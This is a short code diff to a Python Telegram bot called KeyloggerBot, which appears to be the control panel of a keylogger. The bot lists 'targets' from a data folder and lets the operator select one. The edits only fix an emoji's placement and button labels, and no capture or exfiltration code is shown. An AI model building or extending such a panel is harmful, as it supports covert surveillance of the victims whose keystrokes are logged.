@@ -17,7 +17,7 @@ class KeyloggerBot:
                 chat_id=message.chat.id,
                 text="KeyLogger Bot Panel!. 📋",
                 reply_markup=InlineKeyboardMarkup(
-                    [[InlineKeyboardButton("Target Lists" 💻, "target_list")]]
+                    [[InlineKeyboardButton("Target Lists 💻", "target_list")]]
                 )
             )
 
@@ -28,7 +28,7 @@ class KeyloggerBot:
                 for name in os.listdir("data/")
             ]
             button_rows = [buttons[i:i + 3] for i in range(0, len(buttons), 3)]
-            await query.edit_message_text("Target Lists", reply_markup=InlineKeyboardMarkup(button_rows))
+            await query.edit_message_text("Target Lists 💻", reply_markup=InlineKeyboardMarkup(button_rows))
 
         @self.app.on_callback_query()
         async def __SelectTarget__(client, query):
